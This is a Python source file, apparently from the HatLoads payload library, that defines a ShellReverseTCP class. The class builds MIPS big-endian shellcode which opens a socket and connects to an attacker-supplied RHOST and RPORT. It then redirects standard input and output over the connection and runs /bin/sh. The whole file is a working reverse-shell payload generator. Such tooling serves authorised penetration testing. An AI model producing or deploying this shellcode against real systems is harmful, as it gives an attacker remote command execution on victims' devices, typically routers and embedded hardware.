#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL']
        else:
            shell = self.shell['sh']

        shell = shell[::-1]
        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            li $t7, -6
            nor $t7, $t7, $zero
            addi $a0, $t7, -3
            addi $a1, $t7, -3
            slti $a2, $zero, -1
            li $v0, 4183
            syscall 0x40404

            sw $v0, -1($sp)
            lw $a0, -1($sp)
            li $t7, 0xfffd
            nor $t7, $t7, $zero
            sw $t7, -32($sp)
            lui $t6, 0x{rport.hex()}
            ori $t6, $t6, 0x{rport.hex()}
            sw $t6, -28($sp)
            lui $t6, 0x{rhost[:2].hex()}
            ori $t6, $t6, 0x{rhost[2:].hex()}
            sw $t6, -26($sp)
            addiu $a1, $sp, -30
            li $t4, -17
            nor $a2, $t4, $zero
            li $v0, 4170
            syscall 0x40404
            
            li $s1, -3
            nor $s1, $s1, $zero
            lw $a0, -1($sp)

        dup:
            move $a1, $s1
            li $v0, 4063
            syscall 0x40404

            li $s0, -1
            addi $s1, $s1, -1
            bne $s1, $s0, dup

            slti $a2, $zero, -1
            lui $t7, 0x2f2f
            ori $t7, $t7, 0x6269
            sw $t7, -20($sp)
            lui $t6, 0x6e2f
            ori $t6, $t6, 0x7368
            sw $t6, -16($sp)
            sw $zero, -12($sp)
            addiu $a0, $sp, -20
            sw $a0, -8($sp)
            sw $zero, -4($sp)
            addiu $a1, $sp, -8
            li $v0, 4011
            syscall 0x40404
        """

        if assemble:
            return self.assemble('mipsbe', shellcode)
        return shellcode
